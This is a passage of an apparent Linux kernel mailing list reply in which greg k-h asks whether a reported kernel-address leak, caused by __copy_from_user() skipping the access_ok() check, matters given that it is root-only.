>> EFAULT, but the leak is already complete. copy_from_user() would have
>> rejected a kernel address via access_ok(); __copy_from_user() does not.
> This is root-only, so there's no security issue really, right?  Or am I
> mistaken?
>
> thanks,
>
> greg k-h
